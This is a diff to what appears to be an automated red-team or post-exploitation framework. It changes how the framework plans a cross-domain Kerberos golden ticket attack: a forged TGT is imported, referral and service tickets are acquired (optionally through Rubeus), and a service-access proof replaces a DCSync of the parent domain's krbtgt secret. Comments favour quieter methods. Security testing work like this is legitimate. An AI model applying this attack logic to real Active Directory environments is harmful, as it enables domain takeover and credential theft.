@@ -3121,10 +3121,10 @@ def _build_forge_golden_ticket_execution_plan(
         proof_resource = "{{kerberos_service_resource}}"
 
     establish_context = _input_bool(inputs, "establish_context", default=True)
-    # The cross-domain parent-DCSync proof is specific to the forge-golden-ticket objective. The default path
-    # lets Windows obtain any referral/service tickets from the imported TGT on demand; explicit asktgs is only
-    # an override. ensure-kerberos-context reuses this builder only to establish a callback-scoped context proven
-    # by service access, so it opts out of the parent-DCSync path.
+    # A cross-domain forge must prove the active callback's target-domain Kerberos context before any later
+    # DCSync becomes admissible. The default path lets Windows obtain referral/service tickets from the imported
+    # TGT on demand; explicit asktgs is only an override. Do not use a parent DCSync as the forge proof itself:
+    # that would expose credential replication before the callback-context gate has been verified.
     cross_domain = (
         bool(target_domain and target_domain != domain)
         and not _input_bool(inputs, "reuse_as_kerberos_context", default=False)
@@ -3182,19 +3182,13 @@ def _build_forge_golden_ticket_execution_plan(
     )
     if cross_domain:
         # Once a forged child-domain TGT is imported into the current Windows logon session, the OS can usually
-        # acquire the inter-realm referral and service ticket naturally when the final operation authenticates.
+        # acquire the inter-realm referral and service ticket naturally when the final service proof authenticates.
         # Explicit Rubeus asktgs remains available for cases that truly need a standalone TGS artifact, but it is
         # not the default: using the native logon context is quieter and avoids transporting large ticket blobs
         # through payload-specific assembly runners.
         child_dc = _input_text(inputs, "child_dc", "source_dc", "child_domain_controller")
         parent_dc = proof_host or _input_text(inputs, "parent_dc", "target_dc", "target_domain_controller")
-        dcsync_parameters: dict[str, Any] = {
-            "domain": target_domain,
-            "account": "krbtgt",
-            "executor": "native",
-        }
-        if parent_dc:
-            dcsync_parameters["dc"] = parent_dc
+        proof_service = f"cifs/{parent_dc}" if parent_dc else "cifs/{{kerberos_service_host}}"
         if explicit_tgs_exchange:
             referral_parameters: dict[str, Any] = {
                 "target_domain": target_domain,
@@ -3220,15 +3214,15 @@ def _build_forge_golden_ticket_execution_plan(
                     operation="kerberos-service-ticket-request",
                     parameters={
                         "target_domain": target_domain,
-                        "service": f"ldap/{parent_dc}" if parent_dc else "ldap/{{kerberos_service_host}}",
+                        "service": proof_service,
                         "ticket_base64": "{{kerberos_ticket_base64}}",
                         "dc": parent_dc or "{{kerberos_service_host}}",
                         "nowrap": True,
                     },
                     capability=action.name,
                     purpose=(
-                        f"explicitly exchange the {target_domain} referral for the LDAP service ticket used "
-                        "by the parent-domain replication proof"
+                        f"explicitly exchange the {target_domain} referral for the service ticket used "
+                        "by the current-callback access proof"
                     ),
                     expected_probe="extract_forged_ticket_artifact",
                     prerequisites=["artifact:kerberos_ticket_base64"],
@@ -3240,12 +3234,12 @@ def _build_forge_golden_ticket_execution_plan(
             if explicit_tgs_exchange
             else (
                 f"load the forged {domain} TGT into the current Kerberos context so the operating system can "
-                f"acquire {target_domain} referral and service tickets before the replication proof"
+                f"acquire {target_domain} referral and service tickets before the access proof"
             )
         )
         inventory_purpose = (
             "verify the explicit parent-domain service ticket is present in the current context before the "
-            "replication proof"
+            "access proof"
             if explicit_tgs_exchange
             else (
                 f"verify the forged {domain} TGT is present in the current context before requesting "
@@ -3295,14 +3289,14 @@ def _build_forge_golden_ticket_execution_plan(
                     operation="kerberos-service-ticket-acquire",
                     parameters={
                         "domain": target_domain,
-                        "service": f"ldap/{parent_dc}" if parent_dc else "ldap/{{kerberos_service_host}}",
+                        "service": proof_service,
                         "target_context": "current",
                         "store": "agent-cache",
                     },
                     capability=action.name,
                     purpose=(
-                        f"request the {target_domain} LDAP service ticket from the imported current-session "
-                        "TGT before the parent-domain replication proof"
+                        f"request the {target_domain} service ticket from the imported current-session "
+                        "TGT before the current-callback access proof"
                     ),
                     expected_probe="extract_ticket_cache_probe",
                     prerequisites=["ticket:kerberos_ticket_imported"],
@@ -3310,17 +3304,26 @@ def _build_forge_golden_ticket_execution_plan(
             )
         steps.append(
             CapabilityExecutionStep(
-                operation="drsuapi-dcsync",
-                parameters=dcsync_parameters,
+                operation="kerberos-context-service-proof",
+                parameters={
+                    "domain": target_domain,
+                    "resource": proof_resource,
+                    "target_context": "current",
+                    "store": "agent-cache",
+                    "action": "list",
+                    "requires_import": False,
+                    "requires_acquisition": not explicit_tgs_exchange,
+                },
                 capability=action.name,
                 purpose=(
-                    f"prove parent-domain reach by replicating the {target_domain} krbtgt secret from the "
-                    "parent domain controller"
+                    f"prove the current callback has usable {target_domain} service access before any "
+                    "credential-replication capability is exposed"
                 ),
-                expected_probe="extract_dcsync_secret_probe",
+                expected_probe="extract_ticket_probe",
                 prerequisites=[
                     "artifact:kerberos_ticket_base64",
                     "ticket:kerberos_ticket_imported",
+                    "resource:kerberos_service_resource",
                 ],
             ),
         )
@@ -3396,9 +3399,9 @@ def _build_forge_golden_ticket_execution_plan(
         steps=steps,
         reason=(
             (
-                "built cross-domain forge with explicit referral/service TGS exchange and parent-DCSync proof"
+                "built cross-domain forge with explicit referral/service TGS exchange and current-callback service proof"
                 if explicit_tgs_exchange
-                else "built cross-domain forge with OS-native referral acquisition and parent-DCSync proof"
+                else "built cross-domain forge with OS-native referral acquisition and current-callback service proof"
             )
             if cross_domain
             else "built generic Kerberos ticket forge plus isolated context-use and service-proof steps"
@@ -6458,15 +6461,13 @@ def _admin_dcsync_context_gate(
             preferred_callback_id=preferred_callback_id,
             terminal_failed=terminal_failed,
         ), True
-    if domain not in explicit_replication_domains:
-        return "", _ensure_kerberos_context_actions(
-            domain,
-            achieved,
-            live_callback_ids,
-            preferred_callback_id=preferred_callback_id,
-            terminal_failed=terminal_failed,
-        ), True
-    return "", [], False
+    return "", _ensure_kerberos_context_actions(
+        domain,
+        achieved,
+        live_callback_ids,
+        preferred_callback_id=preferred_callback_id,
+        terminal_failed=terminal_failed,
+    ), True
 
 
 def _ensure_kerberos_context_actions(
